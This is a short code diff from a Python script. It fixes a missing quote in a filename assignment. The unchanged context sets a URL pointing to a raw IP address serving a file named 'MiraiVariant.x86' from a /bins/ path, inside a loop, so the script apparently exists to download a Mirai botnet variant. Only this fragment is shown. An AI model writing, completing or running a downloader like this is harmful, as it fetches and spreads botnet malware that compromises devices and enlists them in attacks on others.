@@ -6,7 +6,7 @@ import time
 url = 'http://195.58.39.239/bins/MiraiVariant.x86'
 
 # Define the filename to save the downloaded file as
-filename = Hybrid'
+filename = 'Hybrid'
 
 while True:
     try:
